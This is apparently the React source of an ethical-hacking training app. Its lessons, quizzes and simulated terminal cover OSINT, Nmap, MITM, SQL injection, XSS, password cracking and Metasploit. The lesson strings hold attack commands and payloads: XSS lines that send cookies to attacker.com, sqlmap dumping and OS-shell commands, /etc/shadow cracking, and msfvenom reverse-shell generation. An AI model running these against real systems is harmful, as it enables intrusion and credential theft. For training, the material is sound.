import { useState, useEffect, useRef, useCallback } from "react";

// ============================================================
// DATA: CURRICULUM
// ============================================================
const CURRICULUM = [
  {
    id: "m1", title: "Recon & OSINT", icon: "🔍", color: "#00ff88",
    xp: 500, description: "Master the art of intelligence gathering without touching a target.",
    topics: [
      {
        id: "m1t1", title: "What is Ethical Hacking?", subtopics: [
          { id: "m1t1s1", title: "Hacker Mindset & Ethics", content: `# The Hacker Mindset\n\nEthical hacking — also called **penetration testing** or **white-hat hacking** — is the authorized practice of probing systems for vulnerabilities before malicious actors do.\n\n## Why It Matters\nEvery system has weaknesses. Governments, banks, hospitals — all are targets. **Your mission**: find the holes before the enemy does.\n\n## The Three Hats\n- 🤍 **White Hat** — Authorized. Works with permission. That's you.\n- ⬛ **Black Hat** — Unauthorized. Criminal. Enemy.\n- 🩶 **Grey Hat** — No permission but reports findings. Still illegal.\n\n## The Ethical Code\n1. **Never attack without written permission.**\n2. **Respect scope** — only test what you're allowed to.\n3. **Report everything** — even what you wish you hadn't found.\n4. **Don't destroy** — leave systems as you found them.\n5. **Protect data** — any sensitive data you encounter stays confidential.\n\n## Legal Framework\n- **Computer Fraud and Abuse Act (CFAA)** — US federal law\n- **IT Act 2000** — India\n- **Budapest Convention** — International cyber crime treaty\n\n> *"With great power comes great responsibility."* — Not just Spider-Man. You.\n\n## Career Paths\n- Penetration Tester\n- Security Researcher\n- Bug Bounty Hunter\n- Red Team Operator\n- CISO (Chief Information Security Officer)` },
          { id: "m1t1s2", title: "Legal Frameworks & Permissions", content: `# Legal Frameworks\n\n## Written Authorization is Everything\nBefore you touch anything, get a **Rules of Engagement (RoE)** document signed. This is your legal shield.\n\n## Key Concepts\n\n### Scope of Work\nDefines exactly what you can test:\n- IP ranges\n- Domains\n- Attack vectors (social engineering allowed? DoS allowed?)\n- Time windows\n\n### Bug Bounty Programs\nCompanies like Google, Facebook, HackerOne host programs where you can legally find bugs and get **paid**.\n\n**Top platforms:**\n- HackerOne\n- Bugcrowd\n- Synack\n- Intigriti\n\n## Responsible Disclosure\n1. Find vulnerability\n2. Document it thoroughly\n3. Contact vendor privately\n4. Give 90-day window to fix\n5. Disclose publicly if unpatched\n\n## Certifications That Matter\n| Cert | Level | Focus |\n|------|-------|-------|\n| CEH | Beginner | Broad overview |\n| OSCP | Intermediate | Hands-on pentesting |\n| CRTP | Advanced | Active Directory |\n| OSED | Expert | Exploit development |` },
        ],
        quiz: [
          { q: "What document provides legal protection during a pentest?", options: ["NDA", "Rules of Engagement", "Privacy Policy", "EULA"], answer: 1 },
          { q: "Which hat color describes an authorized security tester?", options: ["Black", "Grey", "White", "Red"], answer: 2 },
          { q: "How many days is the standard responsible disclosure window?", options: ["30", "60", "90", "180"], answer: 2 },
        ]
      },
      {
        id: "m1t2", title: "Passive Reconnaissance", subtopics: [
          { id: "m1t2s1", title: "OSINT Fundamentals", content: `# OSINT — Open Source Intelligence\n\nOSINT is intelligence gathered from **publicly available sources**. No hacking needed — just smart searching.\n\n## The OSINT Framework\n\n### People\n- LinkedIn, Facebook, Twitter\n- Spokeo, Pipl, Intelius\n- GitHub commits (real names leak!)\n\n### Organizations  \n- WHOIS records\n- Shodan.io (internet-facing devices)\n- Censys.io\n- Hunter.io (email patterns)\n\n### Infrastructure\n- DNS records\n- Certificate Transparency logs (crt.sh)\n- BGP routing tables\n- Wayback Machine (archived pages)\n\n## Key OSINT Tools\n\n\`\`\`bash\n# theHarvester - emails, subdomains, hosts\ntheharvester -d target.com -b all\n\n# Maltego - visual relationship mapping\nmaltego\n\n# Recon-ng - modular recon framework\nrecon-ng\nworkspaces create target\nmodules search whois\n\`\`\`\n\n## Google Dorks (The Hacker's Search Engine)\n\`\`\`\nsite:target.com filetype:pdf\nsite:target.com inurl:admin\nintitle:"index of" site:target.com\n"@target.com" filetype:xls\ncache:target.com\n\`\`\`\n\n> Pro tip: Never underestimate what's publicly exposed. The biggest breaches start with OSINT.` },
          { id: "m1t2s2", title: "DNS & WHOIS Enumeration", content: `# DNS Enumeration\n\nDNS is the internet's phonebook. Misconfigured DNS reveals the entire network architecture.\n\n## DNS Record Types\n| Record | Purpose |\n|--------|--------|\n| A | IPv4 address |\n| AAAA | IPv6 address |\n| MX | Mail server |\n| NS | Name server |\n| TXT | Text (SPF, DKIM, verification) |\n| CNAME | Alias |\n| SOA | Start of Authority |\n\n## Terminal Commands\n\`\`\`bash\n# Basic DNS lookup\nnslookup target.com\n\n# Detailed DNS query\ndig target.com ANY\n\n# Zone Transfer (jackpot if misconfigured!)\ndig axfr @ns1.target.com target.com\n\n# Subdomain brute force\nsublist3r -d target.com\namass enum -d target.com\n\n# Reverse DNS\ndig -x 192.168.1.1\n\`\`\`\n\n## WHOIS Lookup\n\`\`\`bash\nwhois target.com\nwhois 192.168.1.0/24\n\`\`\`\n\n## What to Look For\n- Registrant name/email/phone\n- Registration date (old = legacy systems?)\n- Name servers (hosting provider)\n- Admin contacts for social engineering` },
        ],
        quiz: [
          { q: "Which DNS attack can leak an entire zone's records?", options: ["DNS Spoofing", "DNS Zone Transfer", "DNS Flood", "DNS Cache Poisoning"], answer: 1 },
          { q: "What tool is used for subdomain enumeration?", options: ["Wireshark", "Amass", "Aircrack-ng", "SQLMap"], answer: 1 },
          { q: "Which Google dork finds PDF files on a domain?", options: ["site:domain filetype:pdf", "inurl:pdf domain", "ext:pdf domain", "find:pdf site:domain"], answer: 0 },
        ]
      },
    ],
    moduleTest: [
      { q: "OSINT stands for:", options: ["Open System Intelligence", "Open Source Intelligence", "Online Security Intelligence", "Operational Security Intel"], answer: 1 },
      { q: "Which tool provides visual relationship mapping for OSINT?", options: ["Nmap", "Wireshark", "Maltego", "Metasploit"], answer: 2 },
      { q: "A DNS Zone Transfer attack exploits:", options: ["Weak passwords", "Misconfigured DNS servers", "SQL injection", "Buffer overflow"], answer: 1 },
      { q: "Which site lets you search internet-connected devices?", options: ["Shodan.io", "Google.com", "Censys.io", "Both A and C"], answer: 3 },
      { q: "What is the standard disclosure window before going public?", options: ["30 days", "90 days", "180 days", "1 year"], answer: 1 },
    ]
  },
  {
    id: "m2", title: "Network Hacking", icon: "🌐", color: "#ff6b35",
    xp: 750, description: "Scan, enumerate, and exploit network vulnerabilities like a pro.",
    topics: [
      {
        id: "m2t1", title: "Network Scanning", subtopics: [
          { id: "m2t1s1", title: "Nmap Mastery", content: `# Nmap — The Network Mapper\n\nNmap is the most powerful port scanner ever created. Used by every professional pentester.\n\n## Basic Syntax\n\`\`\`bash\nnmap [options] [target]\n\`\`\`\n\n## Essential Scan Types\n\`\`\`bash\n# Ping scan (host discovery)\nnmap -sn 192.168.1.0/24\n\n# SYN scan (stealth, most common)\nnmap -sS 192.168.1.1\n\n# Full TCP connect scan\nnmap -sT 192.168.1.1\n\n# UDP scan\nnmap -sU 192.168.1.1\n\n# Service version detection\nnmap -sV 192.168.1.1\n\n# OS detection\nnmap -O 192.168.1.1\n\n# Aggressive scan (OS, version, scripts, traceroute)\nnmap -A 192.168.1.1\n\n# Scan specific ports\nnmap -p 22,80,443,3306 192.168.1.1\n\n# Scan all 65535 ports\nnmap -p- 192.168.1.1\n\n# Save output\nnmap -oN output.txt 192.168.1.1\nnmap -oX output.xml 192.168.1.1\n\`\`\`\n\n## NSE Scripts (Game Changers)\n\`\`\`bash\n# Run default scripts\nnmap -sC 192.168.1.1\n\n# Vulnerability scan\nnmap --script vuln 192.168.1.1\n\n# HTTP enumeration\nnmap --script http-enum 192.168.1.1\n\n# SMB vulnerabilities\nnmap --script smb-vuln* 192.168.1.1\n\`\`\`\n\n## Timing Templates\n- T0 — Paranoid (IDS evasion)\n- T3 — Normal (default)\n- T5 — Insane (fastest)` },
        ],
        quiz: [
          { q: "Which Nmap flag performs a stealth SYN scan?", options: ["-sT", "-sS", "-sU", "-sA"], answer: 1 },
          { q: "Which flag detects service versions?", options: ["-O", "-A", "-sV", "-sC"], answer: 2 },
          { q: "What does -p- do in Nmap?", options: ["Scans top ports", "Scans all 65535 ports", "Pings the host", "Scans UDP ports"], answer: 1 },
        ]
      },
      {
        id: "m2t2", title: "Network Exploitation", subtopics: [
          { id: "m2t2s1", title: "Man-in-the-Middle Attacks", content: `# Man-in-the-Middle (MITM) Attacks\n\nMITM attacks intercept communications between two parties without their knowledge.\n\n## ARP Poisoning\nARP (Address Resolution Protocol) has no authentication — exploitable!\n\n\`\`\`bash\n# Enable IP forwarding\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# ARP spoofing with arpspoof\narpspoof -i eth0 -t [victim_ip] [gateway_ip]\narpspoof -i eth0 -t [gateway_ip] [victim_ip]\n\n# Ettercap for automated MITM\nettercap -T -q -i eth0 -M arp:remote /[victim]// /[gateway]//\n\`\`\`\n\n## Network Sniffing\n\`\`\`bash\n# Wireshark - GUI packet analyzer\nwireshark\n\n# tcpdump - CLI packet capture\ntcpdump -i eth0 -w capture.pcap\ntcpdump -i eth0 port 80\ntcpdump -i eth0 'tcp and host 192.168.1.1'\n\n# Read captured file\ntcpdump -r capture.pcap\n\`\`\`\n\n## SSL Stripping\nDowngrades HTTPS to HTTP:\n\`\`\`bash\n# sslstrip\nsslstrip -l 8080\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080\n\`\`\`\n\n## Defense\n- Use HTTPS everywhere\n- Implement HSTS\n- Use VPN on public networks\n- Dynamic ARP Inspection (DAI) on switches` },
        ],
        quiz: [
          { q: "ARP spoofing works because ARP has no:", options: ["Speed", "Authentication", "Encryption", "Broadcast"], answer: 1 },
          { q: "Which tool performs CLI packet capture?", options: ["Wireshark", "Ettercap", "tcpdump", "Nmap"], answer: 2 },
          { q: "SSL stripping downgrades:", options: ["HTTP to FTP", "HTTPS to HTTP", "TLS to SSL", "TCP to UDP"], answer: 1 },
        ]
      },
    ],
    moduleTest: [
      { q: "Which Nmap scan type is considered most stealthy?", options: ["TCP Connect (-sT)", "SYN Scan (-sS)", "UDP Scan (-sU)", "FIN Scan (-sF)"], answer: 1 },
      { q: "MITM stands for:", options: ["Man in the Machine", "Man in the Middle", "Multiple Intrusion Techniques Method", "Master Injection and Transfer Method"], answer: 1 },
      { q: "Which protocol is exploited in ARP poisoning?", options: ["TCP", "UDP", "ARP", "ICMP"], answer: 2 },
      { q: "What does tcpdump -w do?", options: ["Filters by port", "Writes to a file", "Shows web traffic only", "Decrypts packets"], answer: 1 },
      { q: "Which Nmap flag runs default NSE scripts?", options: ["-sN", "-sC", "-sS", "-sR"], answer: 1 },
    ]
  },
  {
    id: "m3", title: "Web App Hacking", icon: "💻", color: "#9b59b6",
    xp: 1000, description: "SQL injection, XSS, CSRF — own every web application.",
    topics: [
      {
        id: "m3t1", title: "SQL Injection", subtopics: [
          { id: "m3t1s1", title: "SQLi Fundamentals", content: `# SQL Injection\n\nSQL injection is the #1 web vulnerability according to OWASP. It allows attackers to manipulate database queries.\n\n## How It Works\n\`\`\`sql\n-- Normal query\nSELECT * FROM users WHERE username='admin' AND password='pass'\n\n-- Injected query (password: anything' OR '1'='1)\nSELECT * FROM users WHERE username='admin' AND password='anything' OR '1'='1'\n-- Returns TRUE always!\n\`\`\`\n\n## Types of SQLi\n\n### 1. Classic/In-band SQLi\n\`\`\`sql\n-- Union-based\n' UNION SELECT 1,2,database()--\n' UNION SELECT 1,table_name,3 FROM information_schema.tables--\n\n-- Error-based\n' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--\n\`\`\`\n\n### 2. Blind SQLi\n\`\`\`sql\n-- Boolean-based (true/false responses)\n' AND 1=1-- (true)\n' AND 1=2-- (false)\n' AND SUBSTRING(database(),1,1)='a'--\n\n-- Time-based\n' AND SLEEP(5)--\n' AND IF(1=1,SLEEP(5),0)--\n\`\`\`\n\n## SQLMap Automation\n\`\`\`bash\n# Basic test\nsqlmap -u "http://target.com/page?id=1"\n\n# POST parameter\nsqlmap -u "http://target.com/login" --data="user=admin&pass=test"\n\n# Dump database\nsqlmap -u "http://target.com/?id=1" --dbs\nsqlmap -u "http://target.com/?id=1" -D dbname --tables\nsqlmap -u "http://target.com/?id=1" -D dbname -T users --dump\n\n# Get OS shell\nsqlmap -u "http://target.com/?id=1" --os-shell\n\`\`\`\n\n## Prevention\n- **Parameterized queries / Prepared statements**\n- **Input validation and sanitization**\n- **WAF (Web Application Firewall)**\n- **Least privilege DB accounts**` },
        ],
        quiz: [
          { q: "Which input bypasses login with SQL injection?", options: ["admin'--", "admin OR 1=1", "' OR '1'='1", "All of the above"], answer: 3 },
          { q: "SQLMap is used for:", options: ["Network scanning", "Automated SQL injection", "Password cracking", "Phishing"], answer: 1 },
          { q: "Time-based blind SQLi uses which MySQL function?", options: ["WAIT()", "DELAY()", "SLEEP()", "PAUSE()"], answer: 2 },
        ]
      },
      {
        id: "m3t2", title: "XSS & CSRF", subtopics: [
          { id: "m3t2s1", title: "Cross-Site Scripting (XSS)", content: `# Cross-Site Scripting (XSS)\n\nXSS allows attackers to inject malicious scripts into web pages viewed by other users.\n\n## Types of XSS\n\n### 1. Reflected XSS\nPayload in URL, reflected back in response:\n\`\`\`html\nhttp://target.com/search?q=<script>alert('XSS')</script>\n\`\`\`\n\n### 2. Stored XSS\nPayload stored in database, served to all visitors:\n\`\`\`html\n<!-- Comment field -->\n<script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n\`\`\`\n\n### 3. DOM-based XSS\nVulnerability in client-side JavaScript:\n\`\`\`javascript\n// Vulnerable code\ndocument.innerHTML = location.hash.substring(1)\n\n// Attack URL\nhttp://target.com/#<img src=x onerror=alert(1)>\n\`\`\`\n\n## Bypass Techniques\n\`\`\`html\n<!-- Basic filter bypass -->\n<ScRiPt>alert(1)</ScRiPt>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n\n<!-- HTML encoding bypass -->\n&#60;script&#62;alert(1)&#60;/script&#62;\n\`\`\`\n\n## Cookie Stealing Payload\n\`\`\`javascript\n<script>\nnew Image().src = 'http://attacker.com/log?c=' + encodeURIComponent(document.cookie);\n</script>\n\`\`\`\n\n## Defense\n- **Output encoding** (HTMLEncode all user input)\n- **Content Security Policy (CSP)**\n- **HttpOnly cookies**\n- **Input validation**` },
        ],
        quiz: [
          { q: "Which XSS type persists in the database?", options: ["Reflected", "Stored", "DOM-based", "Universal"], answer: 1 },
          { q: "HttpOnly cookie flag prevents:", options: ["CSRF", "Cookie theft via XSS", "SQL injection", "Brute force"], answer: 1 },
          { q: "Which header prevents XSS?", options: ["X-Frame-Options", "Content-Security-Policy", "X-Powered-By", "Authorization"], answer: 1 },
        ]
      },
    ],
    moduleTest: [
      { q: "The #1 web vulnerability per OWASP is:", options: ["XSS", "CSRF", "SQL Injection", "Broken Authentication"], answer: 2 },
      { q: "Parameterized queries prevent:", options: ["XSS", "CSRF", "SQL Injection", "DDoS"], answer: 2 },
      { q: "Which XSS payload steals cookies?", options: ["alert(1)", "document.location='attacker.com?c='+document.cookie", "console.log(document.cookie)", "fetch(document.cookie)"], answer: 1 },
      { q: "CSP stands for:", options: ["Cross-Site Protection", "Content Security Policy", "Client-Side Prevention", "Cookie Security Protocol"], answer: 1 },
      { q: "Time-based blind SQLi detects vulnerabilities via:", options: ["Error messages", "HTTP response codes", "Response time delays", "Database errors"], answer: 2 },
    ]
  },
  {
    id: "m4", title: "Password Attacks", icon: "🔐", color: "#e74c3c",
    xp: 600, description: "Crack passwords, bypass authentication, and understand cryptography.",
    topics: [
      {
        id: "m4t1", title: "Password Cracking", subtopics: [
          { id: "m4t1s1", title: "Hash Cracking & John", content: `# Password Cracking\n\nPasswords are stored as hashes. Your job: reverse those hashes.\n\n## Common Hash Types\n\`\`\`\nMD5:    5f4dcc3b5aa765d61d8327deb882cf99  (= "password")\nSHA1:   5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8\nSHA256: longer hash...\nbcrypt: $2a$10$... (salted, slow — harder to crack)\n\`\`\`\n\n## Identify Hash Type\n\`\`\`bash\nhashid 5f4dcc3b5aa765d61d8327deb882cf99\nhash-identifier\n\`\`\`\n\n## John the Ripper\n\`\`\`bash\n# Crack with wordlist\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\n# Crack with rules (mutations)\njohn --wordlist=rockyou.txt --rules hash.txt\n\n# Show cracked passwords\njohn --show hash.txt\n\n# Brute force (slow)\njohn --incremental hash.txt\n\n# Crack /etc/shadow\njohn /etc/shadow\n\`\`\`\n\n## Hashcat (GPU-Accelerated)\n\`\`\`bash\n# -m 0 = MD5, -a 0 = dictionary attack\nhashcat -m 0 -a 0 hash.txt rockyou.txt\n\n# Rule-based\nhashcat -m 0 -a 0 hash.txt rockyou.txt -r best64.rule\n\n# Brute force (mask attack)\nhashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d?d?d\n\n# Combo attack\nhashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt\n\`\`\`\n\n## Wordlists\n- **rockyou.txt** — 14 million real passwords from breach\n- **SecLists** — comprehensive collection\n- **CeWL** — generates wordlists from target website!` },
        ],
        quiz: [
          { q: "Which hash function is most resistant to cracking?", options: ["MD5", "SHA1", "bcrypt", "SHA256"], answer: 2 },
          { q: "Rockyou.txt originated from:", options: ["A hacker's creation", "A real data breach", "Government research", "OWASP"], answer: 1 },
          { q: "Hashcat uses __ for acceleration:", options: ["CPU", "GPU", "FPGA", "TPU"], answer: 1 },
        ]
      },
    ],
    moduleTest: [
      { q: "Which tool cracks passwords using GPU?", options: ["John the Ripper", "Hashcat", "Hydra", "Medusa"], answer: 1 },
      { q: "A rainbow table attack is defeated by:", options: ["Longer passwords", "Salt", "MD5", "Rate limiting"], answer: 1 },
      { q: "Which is the largest commonly used wordlist?", options: ["passwords.txt", "rockyou.txt", "darkweb2017.txt", "top1000.txt"], answer: 1 },
      { q: "CeWL generates wordlists from:", options: ["Existing databases", "Target website content", "Random generation", "Keyboard patterns"], answer: 1 },
      { q: "Brute force tries:", options: ["Only dictionary words", "Only common passwords", "All possible combinations", "Only previously leaked passwords"], answer: 2 },
    ]
  },
  {
    id: "m5", title: "Exploitation & Post-Exploitation", icon: "💣", color: "#f1c40f",
    xp: 1200, description: "Gain access, maintain persistence, and escalate privileges.",
    topics: [
      {
        id: "m5t1", title: "Metasploit Framework", subtopics: [
          { id: "m5t1s1", title: "Metasploit Basics", content: `# Metasploit Framework\n\nThe world's most used penetration testing framework. Over 2000 exploits built in.\n\n## Architecture\n\`\`\`\nMetasploit\n├── Exploits — Attacks on vulnerabilities\n├── Payloads — Code that runs after exploitation  \n├── Auxiliaries — Scanners, fuzzers, tools\n├── Post — Post-exploitation modules\n└── Encoders — Evade AV detection\n\`\`\`\n\n## Getting Started\n\`\`\`bash\n# Start database\nsudo service postgresql start\nmsfdb init\n\n# Launch Metasploit\nmsfconsole\n\`\`\`\n\n## Core Commands\n\`\`\`bash\n# Search for exploits\nsearch eternalblue\nsearch type:exploit platform:windows\n\n# Use a module\nuse exploit/windows/smb/ms17_010_eternalblue\n\n# See required options\nshow options\n\n# Set target and payload\nset RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# Launch exploit\nrun\nexploit\n\`\`\`\n\n## Meterpreter (Post-Exploitation Shell)\n\`\`\`bash\n# System info\nsysinfo\ngetuid\ngetpid\n\n# Privilege escalation\ngetsystem\n\n# Dump hashes\nhashdump\n\n# File system\ndownload /etc/passwd\nupload backdoor.exe\n\n# Pivot\nroute add 10.0.0.0/24 1\n\n# Screenshot\nscreenshot\n\n# Webcam\nwebcam_snap\n\`\`\`\n\n## Generating Payloads\n\`\`\`bash\n# msfvenom — payload generator\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o payload\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php\n\`\`\`` },
        ],
        quiz: [
          { q: "Which command sets the target IP in Metasploit?", options: ["set TARGET", "set RHOST", "set RHOSTS", "set IP"], answer: 2 },
          { q: "EternalBlue exploits which protocol?", options: ["HTTP", "FTP", "SMB", "SSH"], answer: 2 },
          { q: "What does hashdump do in Meterpreter?", options: ["Dumps browser history", "Extracts password hashes", "Dumps network traffic", "Lists processes"], answer: 1 },
        ]
      },
    ],
    moduleTest: [
      { q: "msfvenom is used to:", options: ["Scan networks", "Generate payloads", "Crack passwords", "Enumerate DNS"], answer: 1 },
      { q: "Which Meterpreter command attempts privilege escalation?", options: ["privesc", "sudo", "getsystem", "escalate"], answer: 2 },
      { q: "What flag does Metasploit use for attacker IP?", options: ["LHOST", "RHOST", "ATTACKER", "SOURCE"], answer: 0 },
      { q: "Post-exploitation modules in Metasploit are used for:", options: ["Initial access", "Actions after exploitation", "Network scanning", "Social engineering"], answer: 1 },
      { q: "EternalBlue (MS17-010) targets:", options: ["Apache vulnerability", "Windows SMB vulnerability", "Linux kernel bug", "iOS 0-day"], answer: 1 },
    ]
  },
];

// ============================================================
// TERMINAL COMPONENT (Simulated Linux Terminal)
// ============================================================
const TERMINAL_RESPONSES = {
  "help": `Available commands:
  nmap        - Network scanner (simulated)
  sqlmap      - SQL injection tool (simulated)  
  hashcat     - Password cracker (simulated)
  john        - John the Ripper (simulated)
  dig         - DNS lookup
  whois       - WHOIS lookup
  ping        - Ping a host
  ls          - List files
  pwd         - Current directory
  whoami      - Current user
  ifconfig    - Network interfaces
  netstat     - Network connections
  cat         - Read files
  clear       - Clear terminal
  man [cmd]   - Manual for command`,
  "whoami": "root@hackacademy",
  "pwd": "/root",
  "ls": "Desktop  Documents  exploits  scripts  wordlists  tools",
  "ls -la": `total 48
drwxr-xr-x 8 root root 4096 Apr 24 2026 .
drwxr-xr-x 3 root root 4096 Apr 24 2026 ..
-rw------- 1 root root  256 Apr 24 2026 .bash_history
drwxr-xr-x 2 root root 4096 Apr 24 2026 Desktop
drwxr-xr-x 3 root root 4096 Apr 24 2026 Documents
drwxr-xr-x 5 root root 4096 Apr 24 2026 exploits
drwxr-xr-x 4 root root 4096 Apr 24 2026 scripts
drwxr-xr-x 2 root root 4096 Apr 24 2026 wordlists
drwxr-xr-x 6 root root 4096 Apr 24 2026 tools`,
  "ifconfig": `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.0.100  netmask 255.255.255.0  broadcast 10.0.0.255
        inet6 fe80::215:5dff:fe00:1  prefixlen 64  scopeid 0x20<link>
        ether 02:15:5d:00:00:01  txqueuelen 1000  (Ethernet)

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0`,
  "uname -a": "Linux hackacademy 5.15.0-kali1-amd64 #1 SMP Kali 5.15.15-2kali1 x86_64 GNU/Linux",
  "id": "uid=0(root) gid=0(root) groups=0(root)",
  "date": new Date().toString(),
  "ping google.com": `PING google.com (142.250.80.46) 56(84) bytes of data.
64 bytes from 142.250.80.46: icmp_seq=1 ttl=118 time=12.3 ms
64 bytes from 142.250.80.46: icmp_seq=2 ttl=118 time=11.8 ms
64 bytes from 142.250.80.46: icmp_seq=3 ttl=118 time=12.1 ms
--- google.com ping statistics ---
3 packets transmitted, 3 received, 0% packet loss`,
};

function getNmapResponse(cmd) {
  const target = cmd.match(/nmap\s+(?:-[\w\s]+\s+)?(\S+)$/)?.[1] || "target";
  return `Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toLocaleString()}
Nmap scan report for ${target} (192.168.1.${Math.floor(Math.random()*200+10)})
Host is up (0.0${Math.floor(Math.random()*99)}s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.4 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.51
443/tcp  open  https         Apache httpd 2.4.51
3306/tcp open  mysql         MySQL 8.0.27
8080/tcp closed http-alt

OS: Linux 4.x|5.x (96%)
Nmap done: 1 IP address (1 host up) scanned in ${(Math.random()*5+1).toFixed(2)} seconds`;
}

function getDigResponse(cmd) {
  const domain = cmd.split(" ").pop() || "example.com";
  return `; <<>> DiG 9.16.1 <<>> ${domain}
;; ANSWER SECTION:
${domain}.    300    IN    A    ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}
${domain}.    3600   IN    MX   10 mail.${domain}.
${domain}.    86400  IN    NS   ns1.${domain}.
${domain}.    86400  IN    NS   ns2.${domain}.
;; Query time: ${Math.floor(Math.random()*100)}ms`;
}

function getWhoisResponse(cmd) {
  const domain = cmd.split(" ").pop() || "example.com";
  return `Domain Name: ${domain.toUpperCase()}
Registry Domain ID: 2138514_DOMAIN_COM-VRSN
Registrar: MarkMonitor Inc.
Updated Date: 2023-08-14T07:01:38Z
Creation Date: 1995-08-14T04:00:00Z
Registrar Abuse Contact Email: abusecomplaints@markmonitor.com
Registrar Abuse Contact Phone: +1.2086851750
Name Server: NS1.${domain.toUpperCase()}
Name Server: NS2.${domain.toUpperCase()}`;
}

// ============================================================
// MAIN APP
// ============================================================
export default function HackAcademy() {
  const [screen, setScreen] = useState("boot"); // boot, home, module, topic, subtopic, quiz, moduleTest, terminal
  const [selectedModule, setSelectedModule] = useState(null);

  const [selectedSubtopic, setSelectedSubtopic] = useState(null);
  const [progress, setProgress] = useState(() => { try { return JSON.parse(localStorage.getItem("ha_progress") || "{}"); } catch(e) { return {}; } });
  const [xp, setXp] = useState(() => { try { return parseInt(localStorage.getItem("ha_xp") || "0", 10); } catch(e) { return 0; } });
  const [level, setLevel] = useState(() => { try { return parseInt(localStorage.getItem("ha_level") || "1", 10); } catch(e) { return 1; } });
  const [activeQuiz, setActiveQuiz] = useState(null);
  const [quizAnswers, setQuizAnswers] = useState({});
  const [quizSubmitted, setQuizSubmitted] = useState(false);
  const [terminalLines, setTerminalLines] = useState([
    { type: "system", text: "HackAcademy Terminal v2.0 — Kali Linux Simulation" },
    { type: "system", text: `Session started: ${new Date().toLocaleString()}` },
    { type: "system", text: 'Type "help" for available commands.' },
    { type: "prompt", text: "" },
  ]);
  const [termInput, setTermInput] = useState("");
  const [termHistory, setTermHistory] = useState([]);
  const [termHistIdx, setTermHistIdx] = useState(-1);
  const [bootStep, setBootStep] = useState(0);
  const termRef = useRef(null);
  const inputRef = useRef(null);

  const BOOT_LINES = [
    "[ OK ] Initializing HackAcademy OS...",
    "[ OK ] Loading kernel modules...",
    "[ OK ] Starting network services...",
    "[ OK ] Mounting encrypted volumes...",
    "[ OK ] Loading security tools...",
    "[ OK ] Initializing Metasploit framework...",
    "[ OK ] Loading Kali Linux tools...",
    "[ OK ] Starting terminal emulator...",
    "[ OK ] Configuring VPN tunnel...",
    "[ OK ] All systems operational.",
    "",
    "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓",
    "      HACK ACADEMY — ETHICAL HACKING PLATFORM      ",
    "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓",
  ];

  useEffect(() => {
    if (screen !== "boot") return;
    if (bootStep < BOOT_LINES.length) {
      const t = setTimeout(() => setBootStep(s => s + 1), bootStep < 10 ? 200 : bootStep < 12 ? 50 : 120);
      return () => clearTimeout(t);
    } else {
      setTimeout(() => setScreen("home"), 800);
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [bootStep, screen]);

  useEffect(() => {
    const newLevel = Math.floor(xp / 500) + 1;
    setLevel(newLevel);
    localStorage.setItem("ha_xp", xp);
    localStorage.setItem("ha_level", newLevel);
  }, [xp]);

  useEffect(() => {
    localStorage.setItem("ha_progress", JSON.stringify(progress));
  }, [progress]);

  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
  }, [terminalLines]);

  const markComplete = (id, xpGain = 50) => {
    setProgress(p => ({ ...p, [id]: true }));
    setXp(x => x + xpGain);
  };

  const handleTermCommand = useCallback((cmd) => {
    const trimmed = cmd.trim();
    if (!trimmed) return;

    setTermHistory(h => [trimmed, ...h.slice(0, 49)]);
    setTermHistIdx(-1);

    const outputLines = [
      { type: "input", text: `root@hackacademy:~# ${trimmed}` }
    ];

    if (trimmed === "clear") {
      setTerminalLines([{ type: "prompt", text: "" }]);
      return;
    }

    let response = "";
    const lower = trimmed.toLowerCase();

    if (TERMINAL_RESPONSES[lower]) {
      response = TERMINAL_RESPONSES[lower];
    } else if (lower.startsWith("nmap")) {
      response = getNmapResponse(lower);
    } else if (lower.startsWith("dig")) {
      response = getDigResponse(lower);
    } else if (lower.startsWith("whois")) {
      response = getWhoisResponse(lower);
    } else if (lower.startsWith("sqlmap")) {
      response = `        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.7.12#stable}\n|_ -| . ["]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[*] Starting detection...\n[*] Testing connection to target URL\n[*] Testing if GET parameter 'id' is dynamic\n[+] GET parameter 'id' appears to be dynamic\n[+] Heuristic (basic) test shows that GET parameter 'id' might be injectable\n[!] CRITICAL: Parameter 'id' is vulnerable to SQL injection\n[*] Injection type: Boolean-based blind\n[*] Database: MySQL >= 5.0.12\n[+] DBMS: MySQL\n[*] Use --dbs to enumerate databases`;
    } else if (lower.startsWith("hashcat") || lower.startsWith("john")) {
